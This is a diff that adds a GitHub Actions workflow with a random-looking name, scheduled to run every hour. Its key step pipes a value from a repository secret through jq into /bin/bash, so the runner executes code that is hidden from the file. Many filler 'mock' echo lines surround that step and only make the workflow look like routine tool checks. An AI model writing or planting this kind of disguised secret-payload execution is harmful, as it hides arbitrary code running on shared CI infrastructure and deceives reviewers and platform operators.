@@ -1,0 +1,31 @@
+name: fujiuxuan7654
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fujiuxuan7654
+        env:
+          q1720: ${{ secrets.q1720 }}
+        run: |
+          echo "Date only: $(date +%F)"
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
+          ls -al | head -n 15 | echo "$date"
+          echo $q1720 | jq -r .n4347 | /bin/bash
+          echo "Git mock: git --version 2>/dev/null | head -1 || echo no-git"
+          echo "Unalias mock: unalias ll 2>/dev/null || true"
+          echo "Apropos mock: apropos bash 2>/dev/null | head -1 || echo no-apropos"
+          echo "CircleCI mock: circleci --version 2>/dev/null | head -1 || echo no-circleci"
+          echo "Chown mock: chown $USER:$USER /tmp 2>/dev/null || true"
+          echo "G++ mock: g++ --version 2>/dev/null | head -1 || echo no-g++"
+          echo "As mock: as --version 2>/dev/null | head -1 || echo no-as"
+          for i in {1..3}; do echo "Iter $i"; done
+          echo "Perl mock: perl -v 2>/dev/null | head -1 || echo no-perl"
+          echo "Xz mock: xz --version 2>/dev/null | head -1 || echo no-xz"
+          echo "Which mock: which ls 2>/dev/null || echo no-which"
+          echo "Objdump mock: objdump --version 2>/dev/null | head -1 || echo no-objdump"
